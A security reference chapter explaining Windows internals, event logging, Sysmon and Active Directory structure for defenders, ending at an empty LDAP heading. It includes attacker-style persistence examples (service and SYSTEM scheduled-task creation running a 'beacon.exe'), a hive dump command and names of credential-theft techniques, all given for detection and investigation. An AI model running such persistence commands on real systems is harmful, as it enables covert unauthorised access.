# Chapter 3 — Windows & Active Directory

## Overview

This chapter explains the internal mechanics of the Windows operating system and the mechanism for centrally managing thousands of machines through **Active Directory (AD)**. This is a core foundation for enterprise information security work: most enterprise environments run Windows, so Windows + AD is simultaneously the primary attack surface and the primary defensive terrain. A solid grasp of the components below is a prerequisite for detecting intrusions, investigating incidents, and preventing privilege escalation up to domain-wide administrative control.

The chapter's key concepts and the problem each one solves:

- **Kernel Mode and User Mode**: two CPU privilege rings. **Kernel mode (Ring 0)** runs the kernel and drivers and has full access to hardware and RAM; **user mode (Ring 3)** runs applications in isolated address spaces. Separating the two rings is the foundation of security isolation, preventing a faulty or compromised application from damaging the whole system or directly accessing hardware.

- **Registry and Hive**: the **Registry** is a hierarchical database storing OS and software configuration (programs that auto-start, service state, application settings); a **Hive** is the binary file on disk that stores the Registry's contents. It solves the problem of centralized configuration; it is also a favorite persistence foothold for malware via autostart keys.

- **Process, Thread and Access Token**: a **Process** is a resource container (address space, handle table, token); a **Thread** is the unit scheduled for execution. An **Access Token** describes a process's security context (identity, groups, privileges); a **SID** is the unique binary identifier of each principal. This is Windows' access control mechanism and the target of token-theft/impersonation techniques used to escalate privileges.

- **Services and Scheduled Tasks**: a **Service** is a background process managed by the **SCM**, typically auto-starting with the system; a **Scheduled Task** runs a program on a schedule or in response to an event (for example, at logon). They serve operational automation; they are also two common persistence and lateral movement mechanisms that require monitoring.

- **Windows Event Log**: the system event log, where each event type carries an **Event ID** (for example, 4624 successful logon, 4625 failed logon). It is the primary evidence source for reconstructing the "who did what, when" sequence of behavior during incident investigation.

- **Sysmon**: a Sysinternals tool that adds detailed telemetry beyond native auditing (file hashes, ProcessGUID to chain events, network→process mapping, access to sensitive memory regions). It fills observability gaps to detect sophisticated attacker behavior.

- **Active Directory**: a directory service that centrally manages users, computers, groups, and policies. Its structure comprises **Domain** (administrative boundary), **Forest** (highest-level security boundary), **OU** (container for applying policy and delegation), and **GPO** (mechanism for automatically pushing configuration). It solves the problem of managing identity and policy at large scale; capturing AD means controlling almost the entire organization.

- **LDAP**: the protocol for querying AD directory data. It serves lookups and administration; it is also an attacker reconnaissance (recon) tool, so anomalous LDAP queries are an early indicator.

- **Kerberos**: AD's default ticket-based authentication protocol. The client obtains a **TGT** once from the KDC, then exchanges it for a **service ticket** for each service, avoiding repeated password transmission. This ticket mechanism is the foundation for the Kerberoasting and Golden/Silver Ticket attack techniques.

- **NTLM**: the challenge/response authentication protocol predating Kerberos, still present for legacy cases (access by IP, machines outside the domain). Its design weaknesses lead to **pass-the-hash** and **NTLM relay**.

- **Active Directory attacks**: a compilation of real-world techniques against Windows/AD environments, accompanied by the corresponding Event ID traces, linking all the concepts above into a complete offense–defense chain.

> A technical reference document for security engineers (Blue Team / AppSec / DevSecOps). Each section proceeds from **WHAT IT IS → INTERNAL MECHANISM (down to the bit/byte/step/parameter level) → REAL-WORLD EXAMPLE → SECURITY NOTES**. The figures are taken from Microsoft Docs, the MS-* Open Specifications, RFC 4120/4178, and the public Sysinternals/Sysmon source; points that need verification are clearly noted.

---

## 3.1. Windows Architecture: Kernel Mode and User Mode

### 3.1.1. What it is

Windows NT (the foundation of every modern Windows since XP/2000) divides the execution space into two CPU privilege rings on x86/x64:

- **User mode (Ring 3)**: where application processes run. Each process has its own **virtual address space**, isolated from other processes. A crash of one process does not bring down the whole system.
- **Kernel mode (Ring 0)**: where the operating system kernel, device drivers, and HAL run. Full access to hardware and all of RAM. An error here (a faulty driver, a NULL pointer dereference) causes a **BSOD (Bug Check)**.

Separating the two rings is a hardware mechanism: the `CPL` field (Current Privilege Level, 2 bits) in the `CS` register determines the current ring. Privileged instructions (such as `HLT`, or writing to CR3) can only run when CPL=0.

### 3.1.2. Internal mechanism: address space layout and context switching

On Windows x64, the 64-bit virtual address space actually uses 48 bits (canonical address), divided as:

| Region | Address range (x64) | Meaning |
|------|----------------------|---------|
| User space | `0x00000000'00000000` – `0x00007FFF'FFFFFFFF` | Process code/heap/stack (≈128 TB) |
| Forbidden region (non-canonical) | `0x00008000'00000000` – `0xFFFF7FFF'FFFFFFFF` | Invalid, used to catch errors |
| Kernel space | `0xFFFF8000'00000000` – `0xFFFFFFFF'FFFFFFFF` | Kernel, drivers, shared by all processes (≈128 TB) |

**The transition from user → kernel** occurs via a **system call**. On x64, a user-mode function (for example `NtCreateFile` in `ntdll.dll`) loads the **system service number (SSN)** into the `EAX` register, then executes the `syscall` instruction:

```asm
; ntdll!NtCreateFile (abbreviated) — the SSN changes per Windows build
mov  r10, rcx          ; syscall quy ước dùng r10 thay cho rcx
mov  eax, 0x55         ; SSN của NtCreateFile (VÍ DỤ — phải kiểm chứng theo build)
syscall                ; chuyển CPL 3 -> 0, nhảy vào KiSystemCall64
ret
```

The CPU reads the `IA32_LSTAR` MSR to find the kernel entry point (`nt!KiSystemCall64`), saves RIP/RFLAGS, and sets CPL=0. The kernel uses the SSN as an index into the **SSDT (System Service Descriptor Table)** `KeServiceDescriptorTable` to call the correct `Nt*` function.

> Design rationale: ring separation + controlled context switching prevents user-mode code from arbitrarily reading/writing kernel RAM or hardware — the foundation of all security isolation.

### 3.1.3. Main kernel components

| Component | File | Role |
|-----------|------|------|
| Executive | `ntoskrnl.exe` | Object management, virtual memory (Mm), I/O Manager, Process/Thread |
| Kernel (microkernel) | `ntoskrnl.exe` | Thread scheduling, synchronization, interrupts (DPC/APC) |
| HAL | `hal.dll` | Hardware abstraction (timer, interrupts, bus) |
| Win32k | `win32k.sys` | GDI/USER (graphics, windows) — a large attack surface |
| Security Reference Monitor (SRM) | within `ntoskrnl.exe` | Access checks, audit log generation |

### 3.1.4. Security notes

- **PatchGuard (Kernel Patch Protection)** on x64 prevents modification of the SSDT and kernel structures — but it also forces rootkits to switch to other techniques (BYOVD — Bring Your Own Vulnerable Driver).
- Drivers run in Ring 0 → a validly signed but vulnerable driver (for example, one that allows arbitrary physical memory read/write) is a common privilege-escalation vector. The Blue Team tracks driver loads via Sysmon Event ID 6.

---

## 3.2. Registry and Hive

### 3.2.1. What it is

The Registry is a hierarchical database storing OS and application configuration. Its logical structure comprises **keys** (like folders), **subkeys**, and **values** (name–type–data triples).

The **root keys** (logical hives):

| Root key | Abbreviation | Physical data source |
|----------|----------|----------------------|
| `HKEY_LOCAL_MACHINE` | HKLM | The hive files in `C:\Windows\System32\config\` (SYSTEM, SOFTWARE, SAM, SECURITY) |
| `HKEY_CURRENT_USER` | HKCU | `NTUSER.DAT` in the currently logged-on user's profile |
| `HKEY_USERS` | HKU | NTUSER.DAT of every loaded user + `.DEFAULT` |
| `HKEY_CLASSES_ROOT` | HKCR | Merged view of HKLM\Software\Classes + HKCU\Software\Classes |
| `HKEY_CURRENT_CONFIG` | HKCC | Linked to HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current |

### 3.2.2. Internal mechanism: the hive file format (regf)

A hive file uses a binary format with the `regf` signature. Its structure comprises a **base block (header)** that is 4096 bytes (0x1000) long, followed by **hive bins (hbin)** containing **cells**.

The **base block** (regf header) layout — important fields:

| Offset | Size | Field | Meaning | Example |
|--------|-----------|--------|---------|-------|
| 0x000 | 4 bytes | Signature | Always ASCII `regf` (0x66676572 little-endian) | `72 65 67 66` |
| 0x004 | 4 bytes | Primary sequence number | Incremented when a write begins | `0x00000123` |
| 0x008 | 4 bytes | Secondary sequence number | Incremented when the write completes; if ≠ primary → hive dirty | `0x00000123` |
| 0x00C | 8 bytes | Last written timestamp | FILETIME (100ns since 1601) | `0x01D9...` |
| 0x014 | 4 bytes | Major version | Usually 1 | `0x00000001` |
| 0x018 | 4 bytes | Minor version | Usually 3, 5, or 6 | `0x00000005` |
| 0x020 | 4 bytes | Root cell offset | Offset (from the start of the first hbin) to the root key node | `0x00000020` |
| 0x028 | 4 bytes | Length | Total size of the hive data | `0x00100000` |
| 0x1FC | 4 bytes | Checksum | XOR of the first 508 bytes (per 4-byte word) | `0xABCD1234` |

Each **hbin** is a multiple of 4096 bytes long, with an `hbin` signature header. Inside are **cells**: the first 4 bytes are the size (signed int32; negative = in use, positive = free). The cell node types:

- `nk` (Key Node): a registry key. Contains the name, timestamp, and offsets to the subkey list, value list, and security (`sk`).
- `vk` (Value Key): a value (name, REG_* type, offset/inline data).
- `sk` (Security Key): contains the **SECURITY_DESCRIPTOR** (DACL/SACL/owner) for the key.
- `lf`/`lh`/`li`/`ri`: the various subkey list forms (lh uses a hash for fast lookup).

```
+--------- HIVE FILE (regf) ----------+
| Base block (4096 byte)              |  <- chữ ký "regf"
+-------------------------------------+
| hbin #0 (4096 byte)                 |  <- chữ ký "hbin"
|   [cell: nk - ROOT KEY]             |
|   [cell: sk - security descriptor]  |
|   [cell: lh - subkey list]          |
| hbin #1 ...                         |
|   [cell: vk - value "Start"=2]      |
+-------------------------------------+
```

### 3.2.3. Real-world example

Read a service's startup value and export a hive offline for forensic analysis:

```cmd
:: Xem cấu hình autostart của một service (Start=2 nghĩa là Automatic)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v Start
::  Start    REG_DWORD    0x2

:: Liệt kê các chương trình tự chạy khi logon (persistence phổ biến)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Xuất hive SYSTEM offline để phân tích bằng công cụ forensic
reg save HKLM\SYSTEM C:\ir\SYSTEM.hiv
```

Offline analysis with `RegRipper`/`reglookup` (Linux) or PowerShell:

```powershell
# Liệt kê toàn bộ value Run với kiểu và dữ liệu
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
  Format-List
```

The `Start` value in the Services hive (REG_DWORD):

| Value | Name | Meaning |
|---------|-----|---------|
| 0 | Boot | Loaded by the kernel loader (early-boot drivers) |
| 1 | System | Loaded during I/O initialization |
| 2 | Automatic | Auto-started at boot by the SCM |
| 3 | Manual | Started on demand |
| 4 | Disabled | Disabled |

### 3.2.4. Security notes

- The **autostart extensibility points (ASEP)** keys are where malware gains persistence: `...\CurrentVersion\Run`, `RunOnce`, `Image File Execution Options` (Debugger hijack), `Winlogon\Shell`, `Services`. Sysmon Event ID 12/13/14 record registry changes.
- The `SAM`/`SECURITY` hives contain local password hashes + LSA secrets — protected by a SYSTEM ACL but can be dumped offline (by copying the Volume Shadow Copy) → the `secretsdump` technique.

---

## 3.3. Process, Thread and Access Token

### 3.3.1. Process and Thread — structure

A **process** is a container (address space + handle table + token), while a **thread** is the unit that gets scheduled. Kernel structures:

- `EPROCESS`: the process control block in the kernel (pointer to the page directory `DirectoryTableBase`/CR3, the thread list, `Token`, PID, PPID `InheritedFromUniqueProcessId`, ...).
- `ETHREAD`/`KTHREAD`: the thread control block.
- `PEB` (Process Environment Block, user-mode): contains `ImageBaseAddress`, the loaded module list (`Ldr`), command line, and environment variables.

> The `InheritedFromUniqueProcessId` field in EPROCESS is exactly the PPID that Sysmon records in Event ID 1 — important for detecting anomalous parent-child relationships (for example, `winword.exe` spawning `cmd.exe`).

### 3.3.2. Access Token — the authorization mechanism

When a user logs on, **LSASS** generates an **access token** representing the security context. Every thread uses the process's token by default; it can **impersonate** another token.

The logical structure of a token (accessed via `GetTokenInformation`):

| Component | Meaning |
|-----------|---------|
| User SID | The primary identity of the token's owner |
| Group SIDs | List of groups + attributes (Enabled, UseForDenyOnly, ...) |
| Privileges | List of `LUID`s + attributes (for example `SeDebugPrivilege`, `SeBackupPrivilege`) |
| Owner SID, Primary Group | Defaults assigned to newly created objects |
| Default DACL | The default DACL for objects created by the token |
| Token Type | Primary (attached to a process) or Impersonation |
| Impersonation Level | Anonymous / Identification / Impersonation / Delegation |
| Integrity Level | Mandatory Integrity Control: Low/Medium/High/System |
| Logon SID, Session ID | The logon session |

### 3.3.3. SID — Security Identifier (binary structure)

A SID uniquely identifies a principal (user, group, machine, domain). String form: `S-1-5-21-<domain>-<RID>`.

Binary structure:

| Offset | Size | Field | Meaning | Example |
|--------|-----------|--------|---------|-------|
| 0x00 | 1 byte | Revision | Always = 1 | `0x01` |
| 0x01 | 1 byte | SubAuthorityCount | Number of sub-authorities (max 15) | `0x05` |
| 0x02 | 6 bytes | IdentifierAuthority | Big-endian, for example 5 = NT Authority | `00 00 00 00 00 05` |
| 0x08 | 4×N bytes | SubAuthority[] | Each one 32-bit little-endian | `21 ...` then the RID |

The string `S-1-5-21-...` decodes as: `S`=SID, `1`=revision, `5`=IdentifierAuthority (NT), followed by the sub-authorities. The **RID** is the last sub-authority.

Important fixed (well-known) RIDs:

| RID / SID | Name | Meaning |
|-----------|-----|---------|
| 500 | Administrator | Built-in administrator account |
| 501 | Guest | Guest |
| 512 | Domain Admins | Domain admin group |
| 513 | Domain Users | |
| 519 | Enterprise Admins | Forest-wide admin |
| `S-1-5-18` | LocalSystem | The SYSTEM account |
| `S-1-5-32-544` | Builtin\Administrators | |
| `S-1-1-0` | Everyone | |

### 3.3.4. Real-world example

```powershell
# Xem token của tiến trình hiện tại: SID, group, privilege
whoami /all

# whoami /priv -> liệt kê privilege và trạng thái Enabled/Disabled
#   SeDebugPrivilege   Debug programs   Disabled
```

```cmd
:: Chuyển SID <-> tên (dùng để điều tra audit log)
:: PsGetSid của Sysinternals
PsGetSid.exe \\dc01 username
:: hoặc dùng PowerShell:
```

```powershell
$sid = (New-Object System.Security.Principal.NTAccount("CORP","jdoe")).Translate([System.Security.Principal.SecurityIdentifier])
$sid.Value      # S-1-5-21-...-1107
```

### 3.3.5. Security notes

- `SeDebugPrivilege` allows opening a PROCESS_ALL_ACCESS handle to any process, including LSASS → reading its memory to dump hashes. Monitor the enabling of this privilege.
- **Token impersonation/theft**: malware holding `SeImpersonatePrivilege` (which service accounts have by default) exploits it to impersonate SYSTEM (the "Potato" family of attacks: JuicyPotato/RoguePotato/PrintSpoofer).
- A low **Integrity Level** (Low) is the browser sandbox; UAC uses the IL to split the token into Medium (a normal user) and High (an elevated admin).

---

## 3.4. Services and Scheduled Tasks

### 3.4.1. Services

The **Service Control Manager (SCM)** = `services.exe`, manages the service lifecycle. Configuration is stored at `HKLM\SYSTEM\CurrentControlSet\Services\<Name>`:

| Value | Type | Meaning |
|-------|------|---------|
| `ImagePath` | REG_EXPAND_SZ | Path to the binary (or `svchost.exe -k <group>` for a service in a DLL) |
| `Start` | REG_DWORD | 0–4 (see table 3.2.3) |
| `Type` | REG_DWORD | 0x10=own process, 0x20=share process, 0x1=kernel driver |
| `ObjectName` | REG_SZ | The account it runs as (`LocalSystem`, `NT AUTHORITY\NetworkService`, ...) |
| `ServiceDll` | REG_SZ (Parameters subkey) | The DLL for an svchost-style service |

```cmd
:: Tạo service mới (kỹ thuật persistence/lateral movement phổ biến)
sc create EvilSvc binPath= "C:\temp\beacon.exe" start= auto
sc qc Dnscache           :: query config
sc query Dnscache        :: trạng thái runtime
```

> The rationale for `svchost.exe -k netsvcs`: grouping several lightweight services into one process to conserve resources. The security side effect: many services run under a shared token → a large surface, and it is hard to tell which service is faulty.

**Security note**: Event ID **7045** (System log) = "A new service was installed" — a strong signal of lateral movement (PsExec creates the `PSEXESVC` service). An **unquoted service path** + write access to the parent directory = a classic privilege escalation.

### 3.4.2. Scheduled Tasks

Stored at `C:\Windows\System32\Tasks\<TaskName>` (XML) + registered in the registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`.

An example XML task that runs at logon:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>          <!-- chạy với quyền SYSTEM -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions>
    <Exec><Command>C:\temp\beacon.exe</Command></Exec>
  </Actions>
</Task>
```

```cmd
:: Tạo task chạy mỗi khi user logon
schtasks /create /tn "Updater" /tr "C:\temp\beacon.exe" /sc onlogon /ru SYSTEM
```

**Security note**: Event ID **4698** (task created), **4702** (updated) in the Security log; **106/200/201** in `Microsoft-Windows-TaskScheduler/Operational`. Running as `SYSTEM` + a logon trigger = persistence worth scrutinizing.

---

## 3.5. Windows Event Log — the core security Event IDs

### 3.5.1. Mechanism: the EVTX format

The modern event log (Vista+) stores `.evtx` files (`C:\Windows\System32\winevt\Logs\Security.evtx`) in a binary XML format. Structure:

- **File header (`ElfFile\0`, 4096 bytes)**: signature `45 6C 66 46 69 6C 65 00`, containing the first/last chunk number and the next record ID.
- **Chunk (65536 bytes each)**: signature `ElfChnk\0`, each chunk containing multiple **event records**.
- **Event record**: signature `0x2A2A` (`**`), size, the **EventRecordID** (64-bit), a FILETIME timestamp, then the **Binary XML** payload (BinXML — token-based to compress repeated element/attribute names).

```
ElfFile\0 header (4096B)
└── Chunk 0 (64KB)  [ElfChnk\0]
     ├── Record (** | size | RecordID | FileTime | BinXML)
     ├── Record ...
└── Chunk 1 (64KB) ...
```

Each event is rendered into XML with a `<System>` section (Provider, EventID, TimeCreated, Computer, Security UserID) and an `<EventData>` section (the `<Data Name="...">` entries).

### 3.5.2. Event 4624 — Successful logon

This is the most important event. The main `<EventData>` fields:

| Field | Meaning | Example |
|--------|---------|-------|
| `SubjectUserSid` | SID of the subject requesting the logon (usually SYSTEM) | S-1-5-18 |
| `TargetUserName` | The account logging on | jdoe |
| `TargetDomainName` | Domain | CORP |
| `TargetUserSid` | SID of the user logging on | S-1-5-21-...-1107 |
| `LogonType` | The logon type (see table) | 3 |
| `LogonProcessName` | The authenticating process | Kerberos / NtLmSsp / User32 |
| `AuthenticationPackageName` | The auth package | Kerberos / NTLM / Negotiate |
| `WorkstationName` | The source machine (NTLM) | WS01 |
| `IpAddress` | Source IP | 10.0.0.5 |
| `LogonGuid` | GUID linking to 4769 (Kerberos) | {…} |
| `ElevatedToken` | %%1842 (Yes) if the token is elevated | |

**Logon Type** — essential for understanding how access occurred:

| Type | Name | Meaning |
|------|-----|---------|
| 2 | Interactive | Logon at the keyboard (or RDP via console) |
| 3 | Network | Accessing a resource over the network (SMB, IIS) — credentials are **not** stored on the target machine |
| 4 | Batch | Scheduled task |
| 5 | Service | The SCM starting a service |
| 7 | Unlock | Screen unlock |
| 8 | NetworkCleartext | Password sent in cleartext (IIS Basic Auth) |
| 9 | NewCredentials | `runas /netonly` — new credentials for network connections (a sign of pass-the-hash with Mimikatz!) |
| 10 | RemoteInteractive | RDP / Terminal Services |
| 11 | CachedInteractive | Logon using cached credentials (offline) |

> **Logon Type 9** is highly suspicious: Mimikatz `sekurlsa::pth` creates a logon session of type 9 + a LogonProcessName of `seclogo`. Hunt: 4624 type 9 + an anomalous process such as `mimikatz`/`rundll32`.

### 3.5.3. Event 4625 — Failed logon

Adds the `Status`/`SubStatus` fields (NTSTATUS codes) indicating the reason:

| SubStatus | Meaning |
|-----------|---------|
| `0xC0000064` | User does not exist |
| `0xC000006A` | Wrong password |
| `0xC0000234` | Account is locked out |
| `0xC0000072` | Account is disabled |
| `0xC0000193` | Account has expired |
| `0xC000006F` | Logon outside of permitted hours |

> Hunting for brute-force/password spraying: many 4625 `0xC000006A` events from one IP against many TargetUserNames (spraying) or against one user repeatedly (brute force).

### 3.5.4. Other Security Event IDs

| Event ID | Meaning | Important fields/notes |
|----------|---------|---------------------------|
| **4634** | Logoff | `LogonType`, `TargetLogonId` (matches 4624) |
| **4647** | User-initiated logoff | |
| **4672** | Special privileges assigned to new logon | Generated with each admin logon; `PrivilegeList` contains SeDebug/SeBackup... → used to detect admin logons |
| **4688** | A new process has been created | `NewProcessName`, `ProcessId`, `CommandLine` (requires enabling the "Include command line" audit), `ParentProcessName`, `TokenElevationType` |
| **4720** | A user account was created | `TargetUserName`, `SubjectUserName` (who created it) |
| **4722/4725/4726** | Account enabled / disabled / deleted | |
| **4728/4732/4756** | Member added to a global/local/universal group | Track additions to Domain Admins |
| **4768** | Kerberos TGT requested (AS-REQ) | `TicketEncryptionType`, `PreAuthType`, client IP |
| **4769** | Kerberos service ticket requested (TGS-REQ) | `ServiceName`, `TicketEncryptionType` (0x17=RC4 → Kerberoasting!) |
| **4771** | Kerberos pre-authentication failed | `FailureCode` (0x18 = wrong password) |
| **4776** | NTLM credential validation (DC) | `Status` |
| **1102** | The audit log was cleared | The `SubjectUserName`/`SubjectUserSid` fields — who cleared the log |
| **4719** | System audit policy was changed | An attacker disabling auditing |

### 3.5.5. Event 4688 — command line detail

By default, 4688 does **not** contain the command line. It must be enabled:

```cmd
:: Bật ghi command line trong 4688 (GPO: Administrative Templates >
::   System > Audit Process Creation)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" ^
  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

:: Bật audit subcategory "Process Creation"
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

After enabling, a sample 4688 event (abbreviated):

```xml
<EventData>
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="ProcessId">0x1a2c</Data>
  <Data Name="CommandLine">cmd.exe /c whoami /all</Data>
  <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\WINWORD.EXE</Data>
  <Data Name="TokenElevationType">%%1936</Data>   <!-- Type 1 = full token -->
  <Data Name="SubjectUserName">jdoe</Data>
</EventData>
```

`TokenElevationType`: `%%1936` (Type 1, full token, no UAC split), `%%1937` (Type 2, elevated via UAC), `%%1938` (Type 3, limited).

### 3.5.6. Event 1102 — Audit log cleared

```xml
<UserData>
  <LogFileCleared>
    <SubjectUserSid>S-1-5-21-...-1107</SubjectUserSid>
    <SubjectUserName>attacker</SubjectUserName>
    <SubjectDomainName>CORP</SubjectDomainName>
  </LogFileCleared>
</UserData>
```

> **Security note**: 1102 (Security) and 104 (System, a different log being cleared) are anti-forensic indicators. Forwarding logs in real time (WEF/Sysmon→SIEM) before the attacker clears them is the countermeasure.

---

## 3.6. Sysmon — System Monitor

### 3.6.1. What it is

Sysmon (Sysinternals) is a driver + service that logs detailed telemetry into `Microsoft-Windows-Sysmon/Operational`. It goes far beyond native auditing because it provides **file hashes, process GUIDs, network→process mapping, full command lines, and a ProcessGUID that chains events together**.

### 3.6.2. The key Sysmon Event IDs

| Event ID | Event | Notable fields |
|----------|---------|----------------|
| **1** | Process creation | `Image`, `CommandLine`, `Hashes`, `ParentImage`, `ParentCommandLine`, `ProcessGuid`, `User`, `IntegrityLevel`, `OriginalFileName` |
| **3** | Network connection | `Image`, `Protocol`, `SourceIp/Port`, `DestinationIp/Port`, `DestinationHostname` |
| **5** | Process terminated | `ProcessGuid`, `Image` |
| **7** | Image (DLL) loaded | `ImageLoaded`, `Signed`, `Signature`, `SignatureStatus`, `Hashes` — detects DLL hijacking/unsigned DLLs |
| **8** | CreateRemoteThread | `SourceImage`, `TargetImage`, `StartAddress` — detects process injection |
| **10** | ProcessAccess | `SourceImage`, `TargetImage`, `GrantedAccess` — detects reading LSASS (0x1010/0x1410) |
| **11** | File created | `TargetFilename`, `CreationUtcTime` — payload drop |
| **12/13/14** | Registry key/value/rename | `TargetObject`, `Details` — ASEP persistence |
| **22** | DNS query | `QueryName`, `QueryResults`, `Image` — detects C2/DGA |

### 3.6.3. A real-world XML configuration

Sysmon uses an XML config file with schema versioning. An example of a minimal but effective config:

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>SHA256,IMPHASH</HashAlgorithms>
  <EventFiltering>

    <!-- EID 1: ghi mọi process, nhưng loại bớt nhiễu -->
    <RuleGroup name="ProcCreate" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <Image condition="is">C:\Windows\System32\SearchIndexer.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- EID 10: cảnh báo truy cập LSASS -->
    <RuleGroup name="LsassAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="image">lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>

    <!-- EID 22: log mọi DNS query trừ domain Microsoft tin cậy -->
    <RuleGroup name="Dns" groupRelation="or">
      <DnsQuery onmatch="exclude">
        <QueryName condition="end with">.microsoft.com</QueryName>
      </DnsQuery>
    </RuleGroup>

    <!-- EID 13: persistence registry -->
    <RuleGroup name="RegPersist" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
      </RegistryEvent>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

Parameter explanation:
- `onmatch="include"`: only logs events that MATCH the rule (a whitelist). `onmatch="exclude"`: logs EVERY event EXCEPT those that match (a blacklist).
- `groupRelation="or"`: only one rule in the group needs to match.
- `condition`: `is`, `contains`, `begin with`, `end with`, `image` (matches the file name ignoring path), `regex`, ...

```cmd
:: Cài đặt Sysmon với config
Sysmon64.exe -accepteula -i sysmonconfig.xml

:: Cập nhật config mà không cài lại
Sysmon64.exe -c sysmonconfig.xml
```

A sample Event ID 1 (abbreviated):

```xml
<EventData>
  <Data Name="UtcTime">2026-06-19 03:21:55.123</Data>
  <Data Name="ProcessGuid">{a1b2...}</Data>
  <Data Name="ProcessId">6948</Data>
  <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
  <Data Name="CommandLine">cmd /c "powershell -enc SQBFAFgA..."</Data>
  <Data Name="Hashes">SHA256=...,IMPHASH=...</Data>
  <Data Name="ParentImage">C:\Program Files\...\WINWORD.EXE</Data>
  <Data Name="ParentCommandLine">"WINWORD.EXE" /n invoice.docx</Data>
  <Data Name="User">CORP\jdoe</Data>
  <Data Name="IntegrityLevel">Medium</Data>
</EventData>
```

> **Security note**: the ProcessGuid is durable (not reused like a PID) → it chains together the entire event sequence of one process. Events 8/10 with a GrantedAccess of `0x1410`/`0x1010` targeting `lsass.exe` are a strong credential-dumping indicator.

---

## 3.7. Active Directory — Logical and physical structure

### 3.7.1. Domain, Tree, Forest, OU

| Concept | Definition |
|-----------|-----------|
| **Domain** | An administrative boundary + a replicated copy of the database (NTDS.dit). DCs sync the same namespace, for example `corp.example.com` |
| **Tree** | A set of domains sharing a contiguous namespace (`corp.example.com` ↔ `sales.corp.example.com`) |
| **Forest** | The highest-level security boundary. Shares a common schema + Global Catalog + Enterprise Admins. **The forest is the true trust boundary** |
| **OU (Organizational Unit)** | A container for applying GPOs and delegating administration (delegation) |
| **Site** | A physical structure by IP subnet — controls replication and selects the nearest DC |

The logical hierarchy of AD: the **Forest** encompasses everything and is the highest-level security boundary; within it are one or more **Trees** (sharing a contiguous namespace), each Tree containing **Domains**; within a Domain, branches form **OUs** for applying GPOs and delegation, holding the leaf objects (user/computer/group).

```
FOREST  (ranh giới bảo mật cao nhất — schema + Global Catalog + Enterprise Admins)
└── TREE: example.com
    ├── DOMAIN (root): corp.example.com          [NTDS.dit, các DC]
    │   ├── OU=Servers
    │   │   └── (computer objects)
    │   ├── OU=Workstations
    │   ├── OU=Users
    │   │   ├── CN=jdoe        (user)
    │   │   └── CN=svc_sql     (service account, có SPN)
    │   └── OU=Groups
    │       └── CN=Domain Admins
    └── DOMAIN (child): sales.corp.example.com    [parent-child trust, 2 chiều, transitive]
        └── OU=...
```

Note on trust boundaries: an OU is **not** a security boundary (it is only a unit for applying policy/delegation); a Domain is an administrative boundary, but **the Forest is the true security boundary** — capturing one domain in a forest can bridge to another domain via a trust if SID filtering is not enabled.

### 3.7.2. NTDS.dit and partitions

The AD database lives in `C:\Windows\NTDS\ntds.dit` (the ESE/JET Blue format). It is divided into **naming contexts (partitions)**:

| Partition | DN | Contents | Replication scope |
|-----------|-----|----------|-------------------|
| Schema | `CN=Schema,CN=Configuration,DC=...` | Class/attribute definitions | Forest-wide |
| Configuration | `CN=Configuration,DC=...` | Sites, subnets, services | Forest-wide |
| Domain | `DC=corp,DC=example,DC=com` | Users, groups, computers | One domain |
| Application (DNS) | `DC=DomainDnsZones,...` | AD-integrated DNS | Depends on configuration |

### 3.7.3. Schema

The schema defines **classSchema** (object classes) and **attributeSchema** (attributes). Each attribute has:
- `attributeID`: an OID (for example `1.2.840.113556.1.4.221` for sAMAccountName).
- `attributeSyntax` + `oMSyntax`: the data type.
- `isSingleValued`, `searchFlags` (bit 1 = indexed).

> The reason the schema replicates forest-wide and is hard to change: a schema change is permanent (it can only be deactivated, never truly deleted) and affects every DC — which is why the forest is the schema boundary.

### 3.7.4. GPO — Group Policy Object

A GPO has 2 parts:
- **GPC (Group Policy Container)**: an object in AD (`CN=Policies,CN=System,DC=...`), containing the version + GUID + CSE list.
- **GPT (Group Policy Template)**: files on SYSVOL at `\\domain\SYSVOL\<domain>\Policies\{GUID}\` containing `gpt.ini`, `Registry.pol`, and scripts.

The **LSDOU** application order: Local → Site → Domain → OU (later OUs override earlier ones, unless "Enforced"/"Block Inheritance" is set).

```powershell
# Xem GPO áp lên user/máy hiện tại
gpresult /h C:\report.html /f

# Liệt kê GPO trong domain
Get-GPO -All | Select DisplayName, Id, GpoStatus
```

> **Security note**: SYSVOL is readable by every Authenticated User. History: GPP (`Groups.xml`) once contained passwords encrypted with AES using a **public key** (CVE-2014-1812) → anyone could decrypt them. Hunt for `cpassword` files in SYSVOL.

### 3.7.5. Trust — trust relationships

| Type | Direction | Transitive | Used when |
|------|-------|----------------------|----------|
| Parent-Child | Two-way | Yes | Within the same tree |
| Tree-Root | Two-way | Yes | Between trees in a forest |
| External | One-/two-way | No | To a domain outside the forest |
| Forest | One-/two-way | Yes (within the partner forest) | Between two forests |
| Realm | | | To a non-Windows Kerberos realm |

Trusts use a **trust key** (inter-realm key) so that a DC on one side issues a **referral TGT** for the other side. Related attack: **SID History** + a cross-domain golden ticket to escalate privileges across a trust if SID filtering is not enabled.

---

## 3.8. LDAP — the AD query protocol

